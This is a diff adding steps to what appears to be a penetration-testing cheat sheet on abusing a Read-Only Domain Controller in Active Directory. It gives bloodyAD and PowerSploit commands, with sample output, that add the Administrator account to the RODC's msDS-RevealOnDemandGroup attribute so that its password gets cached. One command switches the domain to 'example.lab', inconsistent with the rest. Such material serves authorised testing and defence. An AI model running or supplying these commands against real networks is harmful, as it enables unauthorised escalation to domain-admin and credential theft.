@@ -43,7 +43,17 @@ RODCs are an alternative for Domain Controllers in less secure physical location
 
 When you have one the following permissions to the RODC computer object: **GenericWrite**, **GenericAll**, **WriteDacl**, **Owns**, **WriteOwner**, **WriteProperty**.
 
-* Add a domain admin account to the RODC's **msDS-RevealOnDemandGroup** attribute 
+* Add a domain admin account to the RODC's **msDS-RevealOnDemandGroup** attribute
+  * Windows/Linux:
+    ```ps1
+    # Get original msDS-RevealOnDemandGroup values 
+    bloodyAD --host 10.10.10.10 -d domain.local -u username -p pass123 get object 'RODC$' --attr msDS-RevealOnDemandGroup
+    distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local
+    msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local
+    # Add the previous value plus the admin account
+    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 set object 'RODC$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
+    ```
+  * Windows only:
   ```ps1
   PowerSploit> Set-DomainObject -Identity RODC$ -Set @{'msDS-RevealOnDemandGroup'=@('CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local', 'CN=Administrator,CN=Users,DC=domain,DC=local')}
   ```
